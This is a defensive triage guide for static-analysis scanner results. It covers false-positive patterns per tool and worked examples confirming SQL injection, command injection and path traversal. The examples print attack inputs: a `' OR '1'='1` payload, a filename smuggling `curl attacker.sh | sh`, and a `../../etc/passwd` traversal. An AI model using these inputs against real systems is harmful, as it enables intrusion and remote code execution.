# Triage guide: false positives and how to confirm a true positive

Read this before triaging a scanner's results. For every candidate, the question is the same: can an attacker in a named position reach this line with input they control, and what do they get? The scanner only says the pattern matched.

## Common false-positive patterns

**Any tool**
- Path is a test, fixture, example, mock or doc (`test/`, `__tests__/`, `fixtures/`, `examples/`, `*.test.*`, `*_test.go`, `docs/`). Not a finding, unless the "test" code ships in the build or the fixture holds a real credential.
- The code is dead: no caller (search for the function name), or behind a build flag that is never set.
- A control covers it in a file the scanner did not connect: framework auto-escaping, an ORM that binds parameters, a schema validator at the route, middleware that enforces auth.

**Opengrep / Semgrep**
- Taint rules that lose track across files report the sink alone. Find the source yourself before deciding.
- `detect-non-literal-regexp`, `detect-non-literal-fs-filename`, `detect-object-injection` fire on any variable. They are findings only when that variable is attacker-controlled.
- Hard-coded "secret" rules match constants like `TOKEN_HEADER = "Authorization"`.

**ESLint security plugin**
- `security/detect-object-injection` (`obj[key]`) is mostly noise. It matters only when `key` is user input **and** the object is used for lookups that can hit `__proto__` or `constructor`, or for authorisation decisions.
- `detect-possible-timing-attacks` fires on any `===` with a name like `password`. It is real only for comparing secrets or signatures.

**Bandit**
- B101 `assert_used` in tests. B311 `random` used for non-security purposes (shuffling, jitter). B603/B607 `subprocess` with a fixed argument list and no shell. B608 SQL "injection" on a query built only from constants.

**gosec**
- G104 unchecked errors are reliability findings, not security ones, unless the error is from a check (signature verify, permission). G304 file inclusion with a path from config, not from request input. G404 `math/rand` for non-secret values.

**Gitleaks / scan-secrets**
- High-entropy test values, provider-documented example keys (the AWS docs key ending in `EXAMPLE`), `{{repeat:c:n}}` placeholders, hashes and UUIDs, public keys and publishable keys (`pk_live_` in client code is meant to be public).
- A hit on an old commit whose file is gone is **still a finding** if the key could be live: history is public to anyone with clone access. Ask the user whether the key was rotated.

**Checkov / Trivy config**
- Rules for production hardening applied to local-dev compose files or test stacks. Lower the priority with the severity matrix rather than dismissing it outright, and say which environment the file is for.
- A resource that is intentionally public (a static website bucket). Confirm with the user, then suppress with a reason.

**Hadolint**
- Mostly hardening and build hygiene (`DL3008` unpinned apt packages, `DL3007` `latest` tag). A real security finding is rarer: secrets in `ENV`/`ARG`, `curl | sh` without verification, running as root in a service image.

**zizmor**
- `template-injection` is real only when the expanded value can be set by an outside contributor (`github.event.issue.title`, `github.head_ref`, PR body, branch names on `pull_request_target`). `inputs.*` on a `workflow_dispatch` that only maintainers can trigger is low.
- `unpinned-uses` and `artipacked` are supply-chain hardening. They are high on workflows that hold secrets or write permissions, and low on read-only CI.

## Confirming a true positive: worked examples

### TS/Node: SQL injection (Opengrep `sqli` rule)

```ts
// src/routes/users.ts:14
router.get('/users', async (req, res) => {
  const rows = await db.query(`SELECT * FROM users WHERE name = '${req.query.name}'`);
```

1. Source: `req.query.name` on a route with no auth middleware (check `app.use` and the router). The attacker is anonymous.
2. Sink: the template string reaches `db.query` with no binding. Check that `db` is the raw driver, not a tagged-template helper that parameterises (`sql\`...\``).
3. Exploit: `?name=' OR '1'='1` returns every row. Blast radius: the whole users table.
4. Verdict: TRUE_POSITIVE, critical. If `db.query` were a tagged template from a library that binds values, it would be a FALSE_POSITIVE, "parameterised by tagged template".

### Python: command injection (Bandit B602)

```python
# app/tasks.py:31
subprocess.run(f"convert {upload.filename} out.png", shell=True)
```

1. Source: `upload.filename` comes from a multipart upload. Check whether the view requires login, because that sets the attacker's position.
2. Check for sanitising between source and sink: `secure_filename()`, a regex allowlist. A random name assigned on save would break the chain.
3. Exploit: a filename of `x.png; curl attacker.sh | sh` runs on the worker.
4. Verdict: TRUE_POSITIVE if the name reaches the shell unchanged. Fix: `subprocess.run(["convert", path, "out.png"])` with a server-chosen path.

### Go: path traversal (gosec G304)

```go
// internal/files/handler.go:22
f, err := os.Open(filepath.Join(baseDir, r.URL.Query().Get("file")))
```

1. Source: query parameter, so any client can reach it.
2. `filepath.Join` cleans `..` but does not keep the result inside `baseDir`: `file=../../etc/passwd` escapes it.
3. Look for a check after the join (`strings.HasPrefix(filepath.Clean(p), baseDir+string(os.PathSeparator))`, or `os.Root` in Go 1.24+). If there is none, it is a TRUE_POSITIVE.
4. Blast radius: any file the service user can read, including config with credentials.

## When you can't decide

Mark NEEDS_VERIFICATION and write the one step you could not confirm ("is `/internal/*` reachable from the internet, or only from the VPC?") plus the cheapest test that settles it. Never upgrade severity to cover uncertainty.
